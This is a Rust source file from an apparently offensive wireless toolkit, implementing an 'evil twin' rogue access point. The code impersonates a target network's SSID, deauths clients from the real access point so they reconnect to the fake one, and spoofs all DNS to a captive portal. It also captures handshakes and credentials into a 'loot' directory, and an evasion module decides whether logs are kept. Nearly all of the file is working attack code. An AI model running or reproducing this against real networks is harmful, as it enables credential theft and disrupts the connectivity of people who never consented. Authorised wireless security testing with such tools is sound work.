//! Evil Twin Access Point
//!
//! Create a rogue access point that mimics a legitimate network.
//! When clients connect, their credentials can be captured.
//!
//! ## How it works
//! 1. Scan for target network to get SSID, channel, security settings
//! 2. Create fake AP with same SSID (optionally on different channel)
//! 3. Deauth clients from real AP to force reconnection
//! 4. Clients may connect to our fake AP
//! 5. Capture EAPOL handshakes or serve captive portal
//!
//! ## Requirements
//! - Two wireless interfaces (one for AP, one for deauth)
//! - Or single interface if not doing simultaneous deauth
//! - Rust-native AP creation

use std::fs;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr};
use std::path::PathBuf;
use std::process::Command;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::thread;
use std::time::{Duration, Instant};

use chrono::Local;
use rustyjack_netlink::{
    AccessPoint, ApConfig, ApSecurity, DhcpConfig, DhcpServer, DnsConfig, DnsRule, DnsServer,
    IptablesManager, Table,
};

use crate::deauth::{DeauthAttacker, DeauthConfig};
use crate::error::{Result, WirelessError};
use crate::frames::MacAddress;
use crate::handshake::HandshakeCapture;
use crate::interface::WirelessInterface;
use crate::netlink_helpers::{
    netlink_add_address, netlink_flush_addresses, netlink_set_interface_down,
    netlink_set_interface_up, select_hw_mode,
};

/// Evil Twin configuration
#[derive(Debug, Clone)]
pub struct EvilTwinConfig {
    /// SSID to impersonate
    pub ssid: String,
    /// Channel to operate on (0 = same as target)
    pub channel: u8,
    /// Interface for the fake AP
    pub ap_interface: String,
    /// Interface for deauth (optional, can be same as ap_interface if not simultaneous)
    pub deauth_interface: Option<String>,
    /// Target BSSID to deauth clients from
    pub target_bssid: Option<MacAddress>,
    /// Run deauth attack simultaneously
    pub simultaneous_deauth: bool,
    /// Deauth burst interval
    pub deauth_interval: Duration,
    /// Total attack duration
    pub duration: Duration,
    /// Use open network (no password) - captive portal style
    pub open_network: bool,
    /// WPA2 password for the fake AP (if not open)
    pub wpa_password: Option<String>,
    /// Path to store captured data
    pub capture_path: String,
}

impl Default for EvilTwinConfig {
    fn default() -> Self {
        Self {
            ssid: String::new(),
            channel: 6,
            ap_interface: "wlan0".to_string(),
            deauth_interface: None,
            target_bssid: None,
            simultaneous_deauth: false,
            deauth_interval: Duration::from_secs(5),
            duration: Duration::from_secs(300), // 5 minutes
            open_network: true,                 // Default to open for captive portal
            wpa_password: None,
            capture_path: "/tmp/evil_twin".to_string(),
        }
    }
}

impl EvilTwinConfig {
    /// Create config for specific target
    pub fn for_target(ssid: &str, bssid: MacAddress, channel: u8) -> Self {
        Self {
            ssid: ssid.to_string(),
            channel,
            target_bssid: Some(bssid),
            ..Default::default()
        }
    }

    /// Set interfaces
    pub fn with_interfaces(mut self, ap: &str, deauth: Option<&str>) -> Self {
        self.ap_interface = ap.to_string();
        self.deauth_interface = deauth.map(|s| s.to_string());
        self
    }

    /// Enable simultaneous deauth
    pub fn with_deauth(mut self, enabled: bool) -> Self {
        self.simultaneous_deauth = enabled;
        self
    }

    /// Set duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }
}

/// Evil Twin attack statistics
#[derive(Debug, Clone, Default)]
pub struct EvilTwinStats {
    /// Attack duration
    pub duration: Duration,
    /// Number of clients that connected
    pub clients_connected: u32,
    /// Number of handshakes captured
    pub handshakes_captured: u32,
    /// Number of deauth packets sent
    pub deauth_packets: u64,
    /// Credentials captured (if captive portal)
    pub credentials_captured: u32,
    /// AP was successfully started
    pub ap_started: bool,
}

struct DhcpRuntime {
    handle: Option<thread::JoinHandle<()>>,
    running: Arc<Mutex<bool>>,
}

/// Evil Twin attack controller
pub struct EvilTwin {
    config: EvilTwinConfig,
    /// Stop flag for coordinating shutdown
    pub stop_flag: Arc<AtomicBool>,
    ap: Option<AccessPoint>,
    dhcp: Option<DhcpRuntime>,
    dns: Option<DnsServer>,
}

impl EvilTwin {
    /// Create new Evil Twin attack
    pub fn new(config: EvilTwinConfig) -> Self {
        Self {
            config,
            stop_flag: Arc::new(AtomicBool::new(false)),
            ap: None,
            dhcp: None,
            dns: None,
        }
    }

    /// Check if required tools are available
    pub fn check_requirements() -> Result<Vec<String>> {
        let missing = Vec::new();

        // No external tools needed - we use Rust implementations
        // (AP, DHCP, DNS, iptables all via rustyjack-netlink)

        Ok(missing)
    }

    /// Start the Evil Twin attack
    pub fn start(&mut self) -> Result<EvilTwinStats> {
        log::info!("Starting Evil Twin attack for SSID: {}", self.config.ssid);

        let mut stats = EvilTwinStats::default();
        let start = Instant::now();

        // Create capture directory
        fs::create_dir_all(&self.config.capture_path)
            .map_err(|e| WirelessError::System(format!("Failed to create capture dir: {}", e)))?;

        // Setup the AP interface
        self.setup_ap_interface()?;

        // Start Rust-native AP
        self.start_access_point()?;
        stats.ap_started = true;

        // Start DHCP/DNS servers
        if let Err(e) = self.start_dhcp_server() {
            let _ = self.cleanup();
            return Err(e);
        }
        if let Err(e) = self.start_dns_server() {
            let _ = self.cleanup();
            return Err(e);
        }

        // Setup NAT/iptables for captive portal
        if self.config.open_network {
            self.setup_captive_portal()?;
        }

        // Start handshake capture
        let _handshake_capture = if !self.config.open_network {
            Some(Arc::new(std::sync::Mutex::new(HandshakeCapture::new(
                self.get_ap_mac()?,
                None,
            ))))
        } else {
            None
        };

        // Start deauth thread if configured
        let deauth_handle = if self.config.simultaneous_deauth {
            if let (Some(ref deauth_iface), Some(ref target)) =
                (&self.config.deauth_interface, &self.config.target_bssid)
            {
                let iface = deauth_iface.clone();
                let bssid = *target;
                let interval = self.config.deauth_interval;
                let stop = Arc::clone(&self.stop_flag);
                let duration = self.config.duration;

                Some(thread::spawn(move || {
                    Self::deauth_loop(&iface, bssid, interval, duration, stop)
                }))
            } else {
                None
            }
        } else {
            None
        };

        // Monitor for connections/handshakes
        let _capture_stop = Arc::clone(&self.stop_flag);
        let _ap_iface = self.config.ap_interface.clone();

        while start.elapsed() < self.config.duration && !self.stop_flag.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_secs(1));

            // Check for connected clients
            if let Ok(clients) = self.get_connected_clients() {
                if clients > stats.clients_connected {
                    log::info!("{} clients connected to fake AP", clients);
                    stats.clients_connected = clients;
                }
            }
        }

        // Stop and cleanup
        self.stop_flag.store(true, Ordering::Relaxed);

        if let Some(handle) = deauth_handle {
            if let Ok(deauth_stats) = handle.join() {
                stats.deauth_packets = deauth_stats.unwrap_or(0);
            }
        }

        stats.duration = start.elapsed();

        // Cleanup
        self.cleanup()?;

        log::info!(
            "Evil Twin attack complete: {} clients, {} handshakes in {:?}",
            stats.clients_connected,
            stats.handshakes_captured,
            stats.duration
        );

        Ok(stats)
    }

    /// Stop the attack
    pub fn stop(&mut self) {
        self.stop_flag.store(true, Ordering::Relaxed);
        let _ = self.cleanup();
    }

    /// Setup AP interface (set IP, etc.)
    fn setup_ap_interface(&self) -> Result<()> {
        let iface = &self.config.ap_interface;

        // Bring interface down
        netlink_set_interface_down(iface)?;

        // Set IP address for AP
        netlink_flush_addresses(iface)?;

        let addr: IpAddr = "192.168.4.1"
            .parse()
            .map_err(|e| WirelessError::System(format!("Failed to parse IP: {}", e)))?;
        netlink_add_address(iface, addr, 24)?;

        // Bring interface up
        netlink_set_interface_up(iface)?;

        Ok(())
    }

    fn stop_ap_best_effort(ap: &mut AccessPoint) {
        if let Ok(handle) = tokio::runtime::Handle::try_current() {
            let _ = handle.block_on(async { ap.stop().await });
        } else if let Ok(rt) = tokio::runtime::Runtime::new() {
            let _ = rt.block_on(async { ap.stop().await });
        }
    }

    /// Start Rust-native Access Point
    fn start_access_point(&mut self) -> Result<()> {
        let channel = if self.config.channel == 0 {
            6
        } else {
            self.config.channel
        };
        let security = if self.config.open_network {
            ApSecurity::Open
        } else {
            ApSecurity::Wpa2Psk {
                passphrase: self
                    .config
                    .wpa_password
                    .clone()
                    .unwrap_or_else(|| "password123".to_string()),
            }
        };

        let ap_config = ApConfig {
            interface: self.config.ap_interface.clone(),
            ssid: self.config.ssid.clone(),
            channel,
            security,
            hidden: false,
            beacon_interval: 100,
            max_clients: 0,
            dtim_period: 2,
            hw_mode: select_hw_mode(&self.config.ap_interface, channel),
        };

        let mut ap = AccessPoint::new(ap_config).map_err(|e| {
            WirelessError::System(format!("Failed to create Access Point: {}", e))
        })?;

        let start_result = tokio::runtime::Handle::try_current()
            .map(|handle| {
                handle.block_on(async {
                    ap.start()
                        .await
                        .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
                })
            })
            .unwrap_or_else(|_| {
                tokio::runtime::Runtime::new()
                    .map_err(|e| {
                        WirelessError::System(format!("Failed to create tokio runtime: {}", e))
                    })
                    .and_then(|rt| {
                        rt.block_on(async {
                            ap.start()
                                .await
                                .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
                        })
                    })
            });

        if let Err(e) = start_result {
            return Err(e);
        }

        self.ap = Some(ap);
        thread::sleep(Duration::from_secs(2));
        log::info!("Rust-native AP started for SSID: {}", self.config.ssid);
        Ok(())
    }

    /// Start DHCP server
    fn start_dhcp_server(&mut self) -> Result<()> {
        if self.dhcp.is_some() {
            return Ok(());
        }
        let logging_enabled = rustyjack_evasion::logs_enabled();
        let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);

        let dhcp_cfg = DhcpConfig {
            interface: self.config.ap_interface.clone(),
            server_ip: gateway_ip,
            subnet_mask: Ipv4Addr::new(255, 255, 255, 0),
            range_start: Ipv4Addr::new(192, 168, 4, 10),
            range_end: Ipv4Addr::new(192, 168, 4, 100),
            router: Some(gateway_ip),
            dns_servers: vec![gateway_ip],
            lease_time_secs: 43200,
            log_packets: logging_enabled,
        };

        let mut server = DhcpServer::new(dhcp_cfg.clone()).map_err(|e| {
            WirelessError::System(format!("Failed to create DHCP server: {}", e))
        })?;
        let running_handle = server.running_handle();
        server
            .start()
            .map_err(|e| WirelessError::System(format!("Failed to start DHCP server: {}", e)))?;
        log::info!(
            "DHCP server bound on {} offering {}-{}",
            self.config.ap_interface,
            dhcp_cfg.range_start,
            dhcp_cfg.range_end
        );

        let handle = thread::spawn(move || {
            if let Err(e) = server.serve() {
                log::error!("DHCP server exited with error: {}", e);
            }
        });

        self.dhcp = Some(DhcpRuntime {
            handle: Some(handle),
            running: running_handle,
        });

        Ok(())
    }

    /// Start DNS server
    fn start_dns_server(&mut self) -> Result<()> {
        if self.dns.is_some() {
            return Ok(());
        }
        let logging_enabled = rustyjack_evasion::logs_enabled();
        let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);

        let default_rule = if self.config.open_network {
            DnsRule::WildcardSpoof(gateway_ip)
        } else {
            DnsRule::PassThrough
        };
        let upstream_dns = if self.config.open_network {
            None
        } else {
            Some(Ipv4Addr::new(8, 8, 8, 8))
        };

        let dns_cfg = DnsConfig {
            interface: self.config.ap_interface.clone(),
            listen_ip: gateway_ip,
            default_rule,
            custom_rules: std::collections::HashMap::new(),
            upstream_dns,
            log_queries: logging_enabled,
        };

        let mut server = DnsServer::new(dns_cfg)
            .map_err(|e| WirelessError::System(format!("Failed to create DNS server: {}", e)))?;
        server
            .start()
            .map_err(|e| WirelessError::System(format!("Failed to start DNS server: {}", e)))?;
        log::info!("DNS server bound on {} ({})", self.config.ap_interface, gateway_ip);

        self.dns = Some(server);
        Ok(())
    }

    /// Setup captive portal redirect
    fn setup_captive_portal(&self) -> Result<()> {
        let iface = &self.config.ap_interface;

        // Enable IP forwarding
        fs::write("/proc/sys/net/ipv4/ip_forward", "1")
            .map_err(|e| WirelessError::System(format!("Failed to enable IP forward: {}", e)))?;

        // Setup iptables for captive portal using Rust implementation
        log::info!("Configuring captive portal iptables via Rust");

        let ipt = IptablesManager::new().map_err(|e| {
            WirelessError::System(format!("Failed to create iptables manager: {}", e))
        })?;

        ipt.setup_captive_portal(iface, "192.168.4.1", 80)
            .map_err(|e| WirelessError::System(format!("Failed to setup captive portal: {}", e)))?;

        log::info!("Captive portal configured successfully");
        Ok(())
    }

    /// Get number of connected clients
    fn get_connected_clients(&self) -> Result<u32> {
        let mut seen = std::collections::HashSet::new();
        if let Ok(contents) = fs::read_to_string("/proc/net/arp") {
            for (idx, line) in contents.lines().enumerate() {
                if idx == 0 {
                    continue;
                }
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() < 6 {
                    continue;
                }
                if parts[5] != self.config.ap_interface {
                    continue;
                }
                let mac = parts[3];
                if mac == "00:00:00:00:00:00" {
                    continue;
                }
                seen.insert(mac.to_string());
            }
        }

        Ok(seen.len() as u32)
    }

    /// Get our AP's MAC address
    fn get_ap_mac(&self) -> Result<MacAddress> {
        let path = format!("/sys/class/net/{}/address", self.config.ap_interface);
        let mac_str = fs::read_to_string(&path)
            .map_err(|e| WirelessError::System(format!("Failed to read MAC: {}", e)))?;

        mac_str
            .trim()
            .parse()
            .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))
    }

    /// Deauth loop for simultaneous attack
    fn deauth_loop(
        interface: &str,
        bssid: MacAddress,
        interval: Duration,
        total_duration: Duration,
        stop: Arc<AtomicBool>,
    ) -> Result<u64> {
        let mut iface = WirelessInterface::new(interface)?;
        iface.set_monitor_mode()?;

        let mut attacker = DeauthAttacker::new(&iface)?;
        let mut total_sent = 0u64;
        let start = Instant::now();

        while start.elapsed() < total_duration && !stop.load(Ordering::Relaxed) {
            let config = DeauthConfig {
                packets_per_burst: 32,
                duration: Duration::from_secs(1),
                ..Default::default()
            };

            if let Ok(stats) = attacker.attack(bssid, None, config) {
                total_sent += stats.packets_sent;
            }

            thread::sleep(interval);
        }

        iface.set_managed_mode()?;
        Ok(total_sent)
    }

    /// Cleanup processes and network config
    fn cleanup(&mut self) -> Result<()> {
        log::info!("Cleaning up Evil Twin...");

        // Stop Access Point
        if let Some(mut ap) = self.ap.take() {
            Self::stop_ap_best_effort(&mut ap);
        }

        // Stop DNS server
        if let Some(mut dns) = self.dns.take() {
            let _ = dns.stop();
        }

        // Stop DHCP server
        if let Some(mut dhcp) = self.dhcp.take() {
            if let Ok(mut running) = dhcp.running.lock() {
                *running = false;
            }
            if let Some(handle) = dhcp.handle.take() {
                let _ = handle.join();
            }
        }

        // Flush iptables using Rust implementation
        if let Ok(ipt) = IptablesManager::new() {
            let _ = ipt.flush_table(Table::Nat);
            let _ = ipt.flush_table(Table::Filter);
        }

        // Reset interface
        let iface = &self.config.ap_interface;
        let _ = netlink_flush_addresses(iface);
        let _ = netlink_set_interface_down(iface);

        // Restart NetworkManager to restore normal operation
        Command::new("systemctl")
            .args(["restart", "NetworkManager"])
            .output()
            .ok();

        Ok(())
    }
}

impl Drop for EvilTwin {
    fn drop(&mut self) {
        let _ = self.cleanup();
    }
}

/// Quick Evil Twin attack function
pub fn quick_evil_twin(
    ssid: &str,
    target_bssid: Option<&str>,
    channel: u8,
    ap_interface: &str,
    duration_secs: u64,
) -> Result<EvilTwinStats> {
    let target = if let Some(bssid_str) = target_bssid {
        Some(
            bssid_str
                .parse()
                .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))?,
        )
    } else {
        None
    };

    let config = EvilTwinConfig {
        ssid: ssid.to_string(),
        channel,
        ap_interface: ap_interface.to_string(),
        target_bssid: target,
        duration: Duration::from_secs(duration_secs),
        ..Default::default()
    };

    let mut attack = EvilTwin::new(config);
    attack.start()
}

/// Evil Twin execution result with loot path
#[derive(Debug, Clone)]
pub struct EvilTwinResult {
    /// Attack statistics
    pub stats: EvilTwinStats,
    /// Path where loot was saved
    pub loot_path: PathBuf,
    /// Log file path
    pub log_path: PathBuf,
}

/// Execute Evil Twin attack with proper loot directory structure
///
/// # Arguments
/// * `config` - Evil Twin configuration
/// * `loot_base` - Base loot directory (default: "loot/Wireless")
/// * `progress` - Callback for progress updates
///
/// # Returns
/// Result containing attack stats and loot paths
pub fn execute_evil_twin<F>(
    config: EvilTwinConfig,
    loot_base: Option<&str>,
    progress: F,
) -> Result<EvilTwinResult>
where
    F: Fn(&str) + Send + Sync + 'static,
{
    // Check requirements first
    let missing = EvilTwin::check_requirements()?;
    if !missing.is_empty() {
        return Err(WirelessError::System(format!(
            "Missing required tools: {}",
            missing.join(", ")
        )));
    }

    // Wrap progress in Arc for sharing between threads
    let progress = Arc::new(progress);

    // Create loot directory structure: loot/Wireless/<ssid>/evil_twin/
    let base = loot_base.unwrap_or("loot/Wireless");
    let target_name = sanitize_filename(&config.ssid);
    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let loot_dir = PathBuf::from(base)
        .join(&target_name)
        .join("evil_twin")
        .join(&timestamp);

    fs::create_dir_all(&loot_dir)
        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;

    progress(&format!(
        "Starting Evil Twin AP: {} on channel {}",
        config.ssid, config.channel
    ));

    // Update config with our loot path
    let mut attack_config = config.clone();
    attack_config.capture_path = loot_dir.to_string_lossy().to_string();

    let logging_enabled = rustyjack_evasion::logs_enabled();

    // Create attack log when enabled
    let (log_path, mut log_file) = if logging_enabled {
        let path = loot_dir.join("attack.log");
        let mut file = fs::File::create(&path)
            .map_err(|e| WirelessError::System(format!("Failed to create log: {}", e)))?;

        writeln!(file, "Evil Twin Attack Log").ok();
        writeln!(
            file,
            "Started: {}",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .ok();
        writeln!(file, "Target SSID: {}", config.ssid).ok();
        writeln!(file, "Channel: {}", config.channel).ok();
        writeln!(file, "AP Interface: {}", config.ap_interface).ok();
        writeln!(
            file,
            "Mode: {}",
            if config.open_network {
                "Open (Captive Portal)"
            } else {
                "WPA2"
            }
        )
        .ok();
        if let Some(ref bssid) = config.target_bssid {
            writeln!(file, "Target BSSID: {}", bssid).ok();
        }
        writeln!(file, "Duration: {:?}", config.duration).ok();
        writeln!(file, "---").ok();
        (path, Some(file))
    } else {
        (PathBuf::new(), None)
    };

    // Create and run attack
    let mut attack = EvilTwin::new(attack_config);
    let start = Instant::now();

    // Monitor thread for progress updates
    let stop_flag = Arc::clone(&attack.stop_flag);
    let progress_ssid = config.ssid.clone();
    let progress_clone = Arc::clone(&progress);
    let progress_thread = thread::spawn(move || {
        let mut last_update = Instant::now();
        while !stop_flag.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_secs(5));
            if last_update.elapsed() >= Duration::from_secs(10) {
                progress_clone(&format!(
                    "Evil Twin '{}' running for {:?}...",
                    progress_ssid,
                    start.elapsed()
                ));
                last_update = Instant::now();
            }
        }
    });

    // Run the attack
    let stats = attack.start()?;

    // Stop progress thread
    attack.stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_thread.join();

    // Log results
    if let Some(log_file) = log_file.as_mut() {
        writeln!(log_file, "---").ok();
        writeln!(log_file, "Attack completed").ok();
        writeln!(log_file, "Duration: {:?}", stats.duration).ok();
        writeln!(log_file, "Clients connected: {}", stats.clients_connected).ok();
        writeln!(
            log_file,
            "Handshakes captured: {}",
            stats.handshakes_captured
        )
        .ok();
        writeln!(log_file, "Deauth packets sent: {}", stats.deauth_packets).ok();
        writeln!(
            log_file,
            "Credentials captured: {}",
            stats.credentials_captured
        )
        .ok();
    }

    progress(&format!(
        "Evil Twin complete: {} clients connected, {} handshakes",
        stats.clients_connected, stats.handshakes_captured
    ));

    Ok(EvilTwinResult {
        stats,
        loot_path: loot_dir,
        log_path,
    })
}

/// Sanitize filename for loot directory
fn sanitize_filename(name: &str) -> String {
    name.chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '_'
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_evil_twin_config() {
        let config = EvilTwinConfig::default();
        assert!(config.open_network);
        assert_eq!(config.channel, 6);

        let config =
            EvilTwinConfig::for_target("TestNetwork", "AA:BB:CC:DD:EE:FF".parse().unwrap(), 11);
        assert_eq!(config.ssid, "TestNetwork");
        assert_eq!(config.channel, 11);
    }

    #[test]
    fn test_requirements_check() {
        // Just ensure it doesn't panic
        let _ = EvilTwin::check_requirements();
    }

    #[test]
    fn test_sanitize_filename() {
        assert_eq!(sanitize_filename("Test Network"), "Test_Network");
        assert_eq!(sanitize_filename("WiFi@Home!"), "WiFi_Home_");
        assert_eq!(sanitize_filename("normal-name_123"), "normal-name_123");
    }
}
